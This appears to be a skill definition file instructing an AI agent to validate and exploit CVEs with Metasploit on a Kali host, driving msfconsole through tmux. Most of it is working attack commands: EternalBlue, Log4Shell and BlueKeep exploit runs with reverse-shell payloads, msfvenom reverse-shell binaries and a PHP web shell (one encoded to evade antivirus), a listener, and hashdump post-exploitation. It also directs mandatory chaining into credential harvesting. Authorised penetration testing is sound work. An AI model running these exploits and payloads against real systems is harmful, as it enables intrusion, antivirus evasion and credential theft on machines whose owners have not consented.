---
name: metasploit
description: >-
  Exploit validation and exploitation using Metasploit Framework. Drives `msfconsole` interactively via a dedicated `tmux` session on the Kali host (no Docker). Validates CVEs discovered by nuclei, nikto, or other scanners with actual exploit modules. Covers exploit selection, payload configuration, exploitation, and post-exploitation pivoting.

  Uses msfconsole, msfvenom, and the Metasploit module database. Chains from /pentester, /analyze-cve, or /post-exploit when exploitable CVEs are confirmed.

  Use when the user asks to validate or exploit a CVE with Metasploit, run an exploit module against a target, generate an msfvenom payload, set up a multi/handler listener, or escalate to Meterpreter for post-exploitation.
argument-hint: <target> [cve=CVE-YYYY-NNNNN] [service=http|smb|ssh|...] [depth=quick|standard|thorough]
user-invocable: true
---

# Metasploit Exploit Validation

You are an expert penetration tester using Metasploit Framework to validate and exploit confirmed vulnerabilities. Your goal: take CVEs and service weaknesses discovered by other tools (nuclei, nikto, nmap) and validate them with actual Metasploit exploit modules — confirming exploitability with working PoCs.

**Request:** $ARGUMENTS

---

## CHAIN COMMITMENTS — DECLARE BEFORE STARTING

Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.

| Trigger | Chain | Mandatory? | Claude Code |
|------|------|------|------|
| Meterpreter / shell session obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` |
| After `Write("pentest/summary.md", "<summary>")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` |
| Shell in container / K8s pod | `/container-k8s-security` | OPTIONAL | `Skill(skill="container-k8s-security")` |

**You WILL invoke `/post-exploit` the moment a session is opened. You WILL invoke `/gh-export` after `Write("pentest/summary.md", "<summary>")`.**


**Logging:** Before invoking any skill above, append a `skill_chain` event to `pentest/events.jsonl` (see CLAUDE.md "Skill logging" for the exact one-liner).

---

## Tools Available

| Tool | Use for |
|------|---------|
| `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
| `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
| `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
| `Bash("jq -nc ... >> pentest/events.jsonl")` | Append events: notes, skill chains, cell updates, findings. Schema and canonical one-liners in [pentester/EVENTS.md](pentester/EVENTS.md). All state changes go through `events.jsonl`. |
| `Bash("uv run python ~/.claude/skills/pentester/refresh.py")` + `Read("pentest/findings.json")` / `Read("pentest/coverage.json")` | Refresh the derived snapshots, then read them. Used by recovery and by the `/gh-export` and `/remediate` chains. |
| `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |

### How to invoke Metasploit modules

Drive the persistent `msfconsole` tmux session opened in Phase 0 step 2. Each interaction is two calls: send the module setup + `exploit`/`run`, then capture the output after a sleep that fits the module type.

**Exploit module (with payload):**
```
Bash("tmux send-keys -t msf 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit' Enter")
Bash("sleep 15; tmux capture-pane -t msf -p | tail -40")
```

**Auxiliary/scanner module (no payload needed):**
```
Bash("tmux send-keys -t msf 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.0.0.0/24; run' Enter")
Bash("sleep 10; tmux capture-pane -t msf -p | tail -40")
```

**Complex setup with multiple `set` commands** (chain them with `;` so one tmux send-keys submits the full config):
```
Bash("tmux send-keys -t msf 'use exploit/multi/http/log4shell_header_injection; set RHOSTS 10.0.0.5; set RPORT 8080; set TARGETURI /; set HTTP_HEADER X-Api-Version; set LHOST 10.0.0.1; set PAYLOAD java/shell_reverse_tcp; exploit' Enter")
Bash("sleep 20; tmux capture-pane -t msf -p | tail -60")
```

Adjust `sleep` per module — exploits with reverse shells need longer waits than `/24` auxiliary scans. If the capture shows the module still running (no prompt returned), sleep again and re-capture.

---

## Depth Presets

| Depth | What runs | Default limits |
|-------|-----------|----------------|
| `quick` | Auxiliary scanner modules only — validate CVEs without exploitation | $0.10 · 15 min · 10 calls |
| `standard` | Quick + exploit modules with safe payloads (cmd/unix/generic) | $0.50 · 45 min · 25 calls |
| `thorough` | Standard + reverse shells + post-exploitation + pivoting | $2.00 · 120 min · 60 calls |

---

## Workflow

### Before running any tool

If the request does not specify a CVE or target service, ask the user:

> **Target:** `<host/IP>`
> **CVE or service:** `<CVE-YYYY-NNNNN or service name>`
> **Do you have a listener host?** (for reverse shells)
>
> **Which depth?**
> - `quick` — auxiliary scanners only, no exploitation *($0.10 · 15 min)*
> - `standard` — exploit with safe payloads *($0.50 · 45 min)*
> - `thorough` — full exploitation + post-exploitation *($2.00 · 120 min)*

---

### Phase 0 — Scope & Setup

0. Call `Bash("mkdir -p pentest/{pocs,diagrams} && touch pentest/events.jsonl") + Write("pentest/scope.json", {...})` with target, depth, and limits
1. Call `# (no dashboard — see pentest/findings.json directly)` — live findings tracker
2. `Bash("tmux new-session -d -s msf 'msfconsole -q'")` — start a persistent msfconsole in tmux so subsequent `tmux send-keys` / `tmux capture-pane` calls drive the same REPL
3. Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` — record target, CVE, service, available credentials

---

### Phase 1 — Module Discovery

**Search Exploit-DB first** (faster than MSF search, covers non-MSF exploits too):
```
Bash("searchsploit saltstack 3000")
Bash("searchsploit --cve CVE-2021-44228")
```

**If no MSF module exists but a standalone exploit is available**, mirror and run it via Kali:
```
Bash("searchsploit -m 48421")                    # download to /tmp/
Bash("head -30 /tmp/48421.py")                   # review the script
Bash("python3 /tmp/48421.py --master TARGET")    # run it
```

**Then search Metasploit modules** (run inside the tmux session):
```
Bash("tmux send-keys -t msf 'search cve:2017-0144' Enter")
Bash("sleep 2; tmux capture-pane -t msf -p | tail -20")
```

**Or search by service/keyword:**
```
Bash("tmux send-keys -t msf 'search type:exploit platform:windows smb' Enter")
Bash("sleep 2; tmux capture-pane -t msf -p | tail -30")
```

**Always do your own lookup** — the Metasploit database has thousands of modules. Never assume a CVE isn't covered. Use these search strategies:

```
# By CVE number (most reliable)
Bash("tmux send-keys -t msf 'search cve:2021-44228' Enter")

# By service + keyword
Bash("tmux send-keys -t msf 'search type:exploit smb eternal' Enter")

# By product name
Bash("tmux send-keys -t msf 'search type:exploit name:saltstack' Enter")

# Also check Exploit-DB (covers non-MSF exploits)
Bash("searchsploit --cve CVE-2009-3103")
Bash("searchsploit opensmtpd 2.0")
```

**Example lookups** (to show the pattern — do not treat as an exhaustive list):

| Search | Finds | Module |
|--------|-------|--------|
| `search cve:2017-0144` | EternalBlue | `exploit/windows/smb/ms17_010_eternalblue` |
| `search cve:2021-44228` | Log4Shell | `exploit/multi/http/log4shell_header_injection` |
| `search cve:2019-0708` | BlueKeep | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
| `search cve:2020-1472` | Zerologon | `auxiliary/admin/dcerpc/cve_2020_1472_zerologon` |
| `search name:smb platform:windows` | All Windows SMB exploits | Multiple results — pick by OS version |

---

### Phase 2 — Vulnerability Validation (all depths)

**Run auxiliary scanner modules to confirm vulnerability without exploiting:**
```
# EternalBlue check (CVE-2017-0144) on a /24
Bash("tmux send-keys -t msf 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.0.0.0/24; run' Enter")
Bash("sleep 30; tmux capture-pane -t msf -p | tail -40")
```

```
# Log4Shell check on a single target
Bash("tmux send-keys -t msf 'use auxiliary/scanner/http/log4shell_scanner; set RHOSTS 10.0.0.5; set RPORT 8080; set TARGETURI /; set LHOST 10.0.0.1; run' Enter")
Bash("sleep 15; tmux capture-pane -t msf -p | tail -40")
```

Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")` for every confirmed vulnerable service. If depth is `quick`, stop here.

---

### Phase 3 — Exploitation (standard+)

**Select payload based on target OS and network position:**

| Scenario | Payload |
|----------|---------|
| Safe validation (no shell) | `cmd/unix/generic` with `set CMD id` |
| Linux reverse shell | `linux/x64/shell_reverse_tcp` |
| Windows reverse shell | `windows/x64/meterpreter/reverse_tcp` |
| Java target | `java/shell_reverse_tcp` |
| Web target (PHP) | `php/meterpreter/reverse_tcp` |
| Firewalled (HTTPS out only) | `windows/x64/meterpreter/reverse_https` |

**Run the exploit:**
```
Bash("tmux send-keys -t msf 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit' Enter")
Bash("sleep 30; tmux capture-pane -t msf -p | tail -60")
# Successful exploit shows 'Meterpreter session 1 opened'. If you see 'Exploit aborted', re-read the capture for the failure mode (host unreachable, payload too big, target patched, wrong target architecture).
```

Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")` with the full Metasploit output as evidence.

#### Running a standalone Python PoC instead of an msfconsole module

If the chosen exploit is a standalone Python script (searchsploit returns `.py`, no Metasploit module exists, or you cloned a public PoC from GitHub), run it via `uv` — never plain `python3`:

1. **`Read` the script first** — confirm what it does and note its imports.
2. **Spot non-stdlib imports** — `requests`, `impacket`, `pycryptodome`, `paramiko`, etc.
3. **Invoke via `uv run`:**
   - Stdlib-only: `Bash("uv run python /tmp/<poc>.py --target TARGET …")`
   - With third-party deps: `Bash("uv run --with requests --with impacket python /tmp/<poc>.py …")`
   - PoC has PEP 723 metadata: `Bash("uv run --script /tmp/<poc>.py …")`

Pre-installed external tools at fixed paths (`/opt/sqlmap/sqlmap.py`, `/opt/jwt_tool/jwt_tool.py`) are exempt — keep their original invocation.

---

### Phase 4 — Post-Exploitation (thorough)

If exploitation succeeds, gather evidence inside the active session:
```
Bash("tmux send-keys -t msf 'sessions -i 1' Enter")
Bash("tmux send-keys -t msf 'sysinfo; getuid; ipconfig' Enter")
Bash("sleep 3; tmux capture-pane -t msf -p | tail -40")
```

**Meterpreter post modules** (run from the meterpreter prompt or via `run post/...`):
```
Bash("tmux send-keys -t msf 'run post/windows/gather/hashdump' Enter")
Bash("tmux send-keys -t msf 'run post/multi/recon/local_exploit_suggester' Enter")
Bash("sleep 10; tmux capture-pane -t msf -p | tail -60")
```

Chain into `/post-exploit` for full privilege escalation and credential harvesting.

---

### Phase 5 — Payload Generation (for manual exploitation)

**Generate payloads with msfvenom** (run as a regular shell command, no tmux needed):
```
# Linux x64 reverse shell ELF
Bash("msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell")

# Windows x64 reverse shell EXE, encoded to bypass simple AV
Bash("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -e x64/xor -i 5 -o /tmp/shell.exe")

# PHP web shell
Bash("msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o /tmp/shell.php")
```

Then start a multi/handler in the tmux session to catch the callback:
```
Bash("tmux send-keys -t msf 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit -j' Enter")
Bash("sleep 3; tmux capture-pane -t msf -p | tail -10")
```

Or chain into `/reverse-shell` for payload generation with listener setup — it covers all platforms and encodings.

---

### Phase 6 — Report & Wrap-Up

1. Call `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with exploitation attack path
2. Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` with exploitation summary:
```
Metasploit Exploitation Summary:
  Target:          [host/IP]
  CVE validated:   [list]
  Modules used:    [list]
  Exploited:       [yes/no — which modules succeeded]
  Access obtained: [shell/meterpreter/none]
  Privilege level: [user/root/SYSTEM]
  Post-exploit:    [hashdump/sysinfo/pivoting]
```
3. `Bash("tmux send-keys -t msf 'exit' Enter; tmux kill-session -t msf")` — close the msfconsole tmux session
4. Call `Write("pentest/summary.md", "<summary>")` with summary
5. **Export GitHub Issues** — invoke the `/gh-export` skill

---

## Chaining Other Skills

| Skill | When to invoke |
|-------|----------------|
| `/analyze-cve` | Need detailed CVE analysis before exploitation |
| `/post-exploit` | Exploitation succeeded — privilege escalation, credential harvesting |
| `/lateral-movement` | Credentials obtained — move through the network |
| `/credential-audit` | Need to crack hashes or test credentials |
| `/gh-export` | Always — after `Write("pentest/summary.md", "<summary>")` |

---

## Finding Severity Guide

| Severity | Criteria | Examples |
|----------|----------|---------|
| **Critical** | Remote code execution confirmed | EternalBlue, Log4Shell, ProxyShell with shell access |
| **High** | Exploitation confirmed but limited access | Authenticated RCE, local privilege escalation |
| **Medium** | Vulnerability confirmed but not exploited | Scanner confirms vulnerable version, no working exploit |
| **Low** | Potential vulnerability, needs manual verification | Version-based detection only |

---

## Rules

- **`Bash("mkdir -p pentest/{pocs,diagrams} && touch pentest/events.jsonl") + Write("pentest/scope.json", {...})` is mandatory** — never run any other tool before it
- **Start with auxiliary scanners** — always validate before exploiting
- **Stay within scope** — only exploit authorized targets
- **Use safe payloads first** — `cmd/unix/generic` with `set CMD id` before reverse shells
- **Document every module run** — call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` before and after each module
- **Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")` for every confirmed vulnerability** — include full MSF output
- **Close the msfconsole tmux session when done** — `Bash("tmux kill-session -t msf")`
- **Never fabricate findings** — only report what Metasploit output confirms
- **Mermaid syntax rules**: use `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
